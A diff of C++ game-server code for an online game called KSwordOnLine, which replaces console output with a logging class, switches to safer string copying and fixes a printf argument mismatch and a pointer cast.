 		m_pGameStatus[lnID].nPlayerIndex = 0;
 		m_pGameStatus[lnID].nExchangeStatus = enumExchangeBegin;
 		m_pGameStatus[lnID].nReplyPingTime = 0;
-		m_pGameStatus[lnID].nSendPingTime = 0;
+		m_pGameStatus[lnID].nSendPingTime = m_nGameLoop;
+		m_pGameStatus[lnID].nNetStatus = nStatus;
+		m_pGameStatus[lnID].nErrorLoopCount = 0;
 		m_pGameStatus[lnID].nPingLoopCount = 0;
+		m_pGameStatus[lnID].nNetidx = lnID;
 	}
 	
 	m_pGameStatus[lnID].nNetStatus = nStatus;
@@ -3324,7 +3560,10 @@ int KSwordOnLineSever::ProcessLoginProtocol(const unsigned long lnID, const char
 	{
 		tagLogicLogin *pLL = ( tagLogicLogin * )pData;
 
-		//cout << "A client try to login..." << endl;//edit by phong kieu client try to login
+		std::ostringstream oss;
+		oss << "A client try to login..." << endl;//edit by phong kieu client try to login
+		
+		GameServerLog::Instance().WriteAndConsole(oss.str());
 
 		if(&pLL->sHWID[0])
 		{
@@ -3338,7 +3577,10 @@ int KSwordOnLineSever::ProcessLoginProtocol(const unsigned long lnID, const char
 		}
 		else
 		{
-			cout << "Player " << lnID << " dont get HWID from client!" << endl;
+			std::ostringstream oss;
+			oss << "Player " << lnID << " dont get HWID from client!" << endl;
+			
+			GameServerLog::Instance().WriteAndConsole(oss.str());
 			return 0;
 		}
 
@@ -3352,15 +3594,22 @@ int KSwordOnLineSever::ProcessLoginProtocol(const unsigned long lnID, const char
 				sLogin.ProtocolID		= enumC2S_TONG_GET_LOGIN_LIMIT;
 				sLogin.m_dwParam		= 1;				//tham so 1
 				sLogin.m_dwTongNameID	= nIdx;				//tham so 2 //#mapping nIdx
-				strcpy(sLogin.m_szName, szHwID);		//tham so 3
+				strcpy_s(sLogin.m_szName, szHwID);		//tham so 3
 				if (m_pTongClient)
 					m_pTongClient->SendPackToServer((const void*)&sLogin, sizeof(sLogin));
 			}
-			//cout << "Found player " << nIdx << " is logging in system!" << endl;
+			std::ostringstream oss;
+			oss << "AttachPlayer success! Found player idx" << nIdx << " is logging in system!" << endl;
+			
+			GameServerLog::Instance().WriteAndConsole(oss.str());
 			return nIdx;
 		}
 		else
 		{
+			std::ostringstream oss;
+			oss << "Can't attach Player to game system!" << endl;
+			
+			GameServerLog::Instance().WriteAndConsole(oss.str());
 			return 0;
 		}
 	}
@@ -3399,7 +3648,7 @@ BOOL KSwordOnLineSever::SendGameDataToClient(const unsigned long lnID, const int
 			if (!SUCCEEDED(m_pServer->PackDataToClient(lnID, &SyncEnd, sizeof(BYTE))))
 #endif
 			{
-				printf("Packing failed. %d, %d, %d\n", lnID);	//[wxb 2003-7-28]
+				printf("Packing failed. %d\n", lnID);	//[wxb 2003-7-28]
 				bRet = FALSE;
 				break;
 			}
@@ -3866,8 +4115,9 @@ void KSwordOnLineSever::ProcessPlayerTongMsg(const unsigned long nPlayerIdx, con
 				sAdd.m_dwNameID = pAccept->m_dwNameID;
 
 				int		nRet = FALSE;
+				intptr_t addressOfsAdd = reinterpret_cast<intptr_t>(&sAdd);  // Use & to get the address
 				if (m_pCoreServerShell)
-					nRet = m_pCoreServerShell->GetGameData(SGDI_TONG_CHECK_ADD_CONDITION, (intptr_t)szTongName, (unsigned int)&sAdd);
+					nRet = m_pCoreServerShell->GetGameData(SGDI_TONG_CHECK_ADD_CONDITION, (intptr_t)szTongName, addressOfsAdd);
 				// œÚ relay …Í«ÎÃÌº”∞Ô÷⁄
 				if (nRet)
 				{
